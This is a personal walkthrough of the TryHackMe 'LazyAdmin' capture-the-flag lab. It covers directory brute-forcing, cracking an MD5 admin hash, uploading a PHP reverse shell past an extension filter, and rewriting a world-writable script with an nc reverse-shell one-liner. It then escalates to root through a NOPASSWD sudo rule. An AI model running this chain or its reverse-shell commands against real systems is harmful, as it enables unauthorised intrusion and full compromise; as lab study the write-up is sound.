@@ -1,0 +1,109 @@
+->CTF Challenge (https://tryhackme.com/room/lazyadmin): -
+
+1)The IP address provided to us,
+IP: 10.10.93.193(First Time)
+IP: 10.10.175.47(Second Time)
+IP: 10.10.198.205(Third Time)
+
+2)Check what is running on that particular IP. Make sure you use http and not https!
+We find that a webpage is being hosted on that particular IP, so we try and find all the directories on that webpage, hidden and visible
+->We use gobuster
+Command: gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://10.10.93.193/ 
+(dir: Because we are searching for directories using gobuster)
+(-w: word list from which searching is to be done)
+(In Kali, we are using word list is stored in: /usr/share/wordlists/dirbuster/)
+(Word list file name we are using: directory-list-2.3-medium.txt)e
+(-u: Website URL)
+->There are multiple wordlists present, we just use this one
+
+->(Sweet Rice is a software that provides CMS(content management system) facilites)
+->(CMS: Likw blogs and posts on a website are managed by it)
+
+3)Through gobuster, we find a /content directory. (We do not scan through the entire wordlist
+as there are a lot of entries and no output is being generated for the major part of it).
+
+4)We again use gobuster to search for directories in the /content
+Command: gobuster -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://10.10.93.193/content  dir
+->We get administrative path at /as
+URL: http://10.10.93.193/content/as/
+->We also get a /inc directory
+URL: http://10.10.93.193/content/inc/
+
+5)From the inc directory, we get a mysql_backup file, which has the admin and password information
+
+6)Use the admin and password for loging into /as.
+->However, the password won't work, as the password is hashed. So, us dCode to decrypt the password and then use it again
+(manager:Password123)
+(Hash Function: MD5)
+
+(Hashing is different from encryption as encyption requires a key and based on the key, it is encrypted, whereas hash functions don't require keys for hashing)
+
+LOGIN SUCCESS!
+
+7)After logging in, we go the media center. Here we can upload files, like we did in DVWA.
+
+8)Upload pentestmonkey.php to get reverse shell, after changing the the IP of the OpenVPN and port number.
+->However, .php files are not uploading, so try another extension and check, like php2, phtml,php3,phps, etcetera.
+->phtml works here!
+
+9)After uploading, open the uploaded file and net cat the port through terminal to get the shell.
+
+10)Now, we first stabalize the shell, so that we are able to use Ctrl+C and Ctrl+Z
+->Refer screenshot "Shell Stabalization.png"
+->First we run the python command(Gives us semi-stabalized): python -c "import pty; pty.spawn('/bin/bash');"
+->Then we go back to Kali's terminal by using Ctrl+z
+->Then execute the following commands:-
+	->stty raw -echo ;fg
+	->reset
+	->xterm
+	->export TERM-xterm
+	->export SHELL=bash
+
+11)Now, we have the stabalized shell. So, we know that the fist flag is in user(given), and user is present in the home directory, so we go there.
+
+12)Keep accessing the directories till you reach user.txt, which has the flag!
+
+13)We get other files as well in the home directory, like mysql_login.txt, backup.pl, etcetera.
+(Contents of mysql_login: rice:randompass)
+
+14)ls -lah the directory, we get hidden files and get more information and get to know that backup.pl is owned by root!
+
+(To clear the terminal, we use TERM, which is used to modify terminal environments)
+(Command: export TERM=xterm)->Now use clear to clear the terminal.
+
+15)Try and read the backup.pl file
+->cat backup.pl
+
+16)We find that it has the script running at /etc/copy.sh. Therefore, the backup.pl is being used to run the copy.sh shell script.
+
+17)Read the file copy.sh. 
+->cat /etc/copy.sh
+Code present in copy.sh: rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.0.190 5554 >/tmp/f
+
+18)Using ls -lah, we find that the file copy.sh has read, write and execute permissions by others as well, so we modify the file. We read the code in the file, understand it, and add our OpenVPN's IP to that code to get the output there.  
+->nano /etc/copy.sh
+->Code present in copy.sh: rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.0.190 5554 >/tmp/f
+(->rm /tmp/f: Removing the f file
+(->mkfifo /tmp/f: Making a new fifo(special file) file f
+(->cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.0.190 5554 >/tmp/f: Reading the file f and providing it as an input to the /bin/sh file. The 2>&1 are special characters that don't provide it's output as an input to the command after |. Thereafter, the through the nc command, whatever command we right on the provided port, we are storing in the f file.)
+
+19)Hence, we change the IP to our system's IP(OpenVPN), so that whatever command we execute on our IP, we can store in f.
+
+20)Now, we need to execute the backup.pl file. Since it is owned by root, hence we check for the commands that are executable by root
+->sudo -l
+->Output: (ALL) NOPASSWD: /usr/bin/perl /home/itguy/backup.pl
+
+21)We find that no commands require root password, rather the NOPASSWD, that is the commands that don't require root password, but are executed by sudo are available. So, we run them.
+->sudo /usr/bin/pearl /home/itguy/backup.pl
+
+22)Also, on a new terminal we open the server at the port mentioned in the copy.sh file, to listen to the command entered.
+->nc -lnvp 5554
+
+23)After running the NOPASSWD command on the terminal, at the 5554 port, we get a shell
+
+24)Stabalise the shell and check which access we have there
+->whoami
+->Output: root
+
+25)Now, we are root, hence can access the root directory, and read the root.txt file to get the root password!
+
